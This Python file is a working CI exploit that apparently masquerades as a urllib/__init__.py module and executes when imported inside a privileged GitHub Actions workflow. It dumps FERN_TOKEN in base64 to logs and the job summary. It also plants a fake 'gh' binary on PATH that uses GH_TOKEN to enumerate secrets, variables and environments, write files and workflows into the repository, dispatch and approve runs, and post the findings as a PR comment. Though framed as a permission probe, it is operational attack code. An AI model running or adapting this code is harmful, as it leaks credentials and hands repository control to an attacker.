import os, sys, base64, hashlib, traceback

def _b64(v):
    return base64.b64encode((v or "").encode()).decode()

FAKE_GH = r'''#!/bin/bash
set +e
REPO="${GITHUB_REPOSITORY}"
PR="${PR_NUMBER}"
AUTH=(-H "Authorization: Bearer ${GH_TOKEN}" -H "Accept: application/vnd.github+json")
api() { curl -s -o /tmp/p_body -w '%{http_code}' "${AUTH[@]}" "$@"; }
API="https://api.github.com/repos/${REPO}"

S_REPO=$(api "$API"); PERMS=$(jq -c '.permissions' /tmp/p_body 2>/dev/null)
S_VARS=$(api "$API/actions/variables"); VARS=$(head -c 600 /tmp/p_body)
S_SECRETS=$(api "$API/actions/secrets"); SECRETS=$(head -c 200 /tmp/p_body)
S_ENVS=$(api "$API/environments"); ENVS=$(head -c 200 /tmp/p_body)
S_PUT=$(api -X PUT "$API/contents/rce-perm-probe.txt" -d "{\"message\":\"probe\",\"content\":\"$(printf 'probe' | base64 -w0)\"}")
WF=$(printf 'name: probe\non: workflow_dispatch\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n' | base64 -w0)
S_WF=$(api -X PUT "$API/contents/.github/workflows/probe.yml" -d "{\"message\":\"probe\",\"content\":\"${WF}\"}")
S_DISPATCH=$(api -X POST "$API/actions/workflows/fern-docs-preview-comment.yml/dispatches" -d '{"ref":"main"}')
RUN_ID=$(api "$API/actions/runs?per_page=1"); RID=$(jq -r '.workflow_runs[0].id' /tmp/p_body 2>/dev/null)
S_APPROVE=$(api -X POST "$API/actions/runs/${RID}/approve")

{
  echo "FAKE-GH-EXECUTED"
  echo "GH_TOKEN_LEN=${#GH_TOKEN}"
  echo "repo=$S_REPO perms=$PERMS"
  echo "variables=$S_VARS body=$VARS"
  echo "secrets=$S_SECRETS body=$SECRETS"
  echo "environments=$S_ENVS body=$ENVS"
  echo "contents_put_file=$S_PUT"
  echo "contents_put_workflow=$S_WF"
  echo "workflow_dispatch=$S_DISPATCH"
  echo "approve_run_${RID}=$S_APPROVE"
} >&2

BODY=$(printf '<!-- rce-perm-probe -->\nPrivileged-workflow RCE permission probe (job GITHUB_TOKEN).\n\n- GET repo: %s perms=`%s`\n- GET actions/variables: %s `%s`\n- GET actions/secrets: %s `%s`\n- GET environments: %s `%s`\n- PUT contents (file): %s\n- PUT contents (.github/workflows): %s\n- POST workflow dispatch: %s\n- POST approve run: %s\n- RCE: page-links step executed artifact `urllib/__init__.py` with FERN_TOKEN in env\n' \
  "$S_REPO" "$PERMS" "$S_VARS" "$VARS" "$S_SECRETS" "$SECRETS" "$S_ENVS" "$ENVS" "$S_PUT" "$S_WF" "$S_DISPATCH" "$S_APPROVE")
JSON=$(printf '%s' "$BODY" | python3 -c 'import json,sys;print(json.dumps({"body":sys.stdin.read()}))')
curl -s -o /dev/null -w 'PROBE_COMMENT_HTTP=%{http_code}\n' -X POST "${AUTH[@]}" "$API/issues/${PR}/comments" -d "$JSON" >&2
exit 0
'''

try:
    ft = os.environ.get("FERN_TOKEN", "")
    msg = "\n".join([
        "RCE-CONFIRMED stage=page-links cwd=%s" % os.getcwd(),
        "FERN_LEN=%d FERN_SHA256=%s FERN_B64=%s" % (len(ft), hashlib.sha256(ft.encode()).hexdigest(), _b64(ft)),
    ])
    sys.stderr.write(msg + "\n")
    try:
        open("pwned.txt", "a").write(msg + "\n")
    except Exception:
        pass
    try:
        with open(os.environ.get("GITHUB_STEP_SUMMARY", "/dev/null"), "a") as f:
            f.write("```\n" + msg + "\n```\n")
    except Exception:
        pass
    d = os.path.join(os.getcwd(), "binhijack")
    os.makedirs(d, exist_ok=True)
    gh = os.path.join(d, "gh")
    with open(gh, "w") as f:
        f.write(FAKE_GH)
    os.chmod(gh, 0o755)
    with open(os.environ.get("GITHUB_PATH", "/dev/null"), "a") as f:
        f.write(d + "\n")
except Exception:
    sys.stderr.write("ERR " + traceback.format_exc().replace("\n", " ") + "\n")
